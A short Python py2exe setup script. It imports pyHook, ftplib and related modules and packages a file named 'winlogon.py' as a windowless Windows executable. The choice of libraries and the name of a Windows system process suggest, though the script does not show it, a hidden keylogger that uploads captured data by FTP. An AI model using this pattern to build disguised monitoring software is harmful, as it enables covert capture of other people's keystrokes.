from distutils.core import setup
import py2exe
import pythoncom
import pyHook
import time
import ftplib
import multiprocessing
import os

setup(windows=['winlogon.py'])
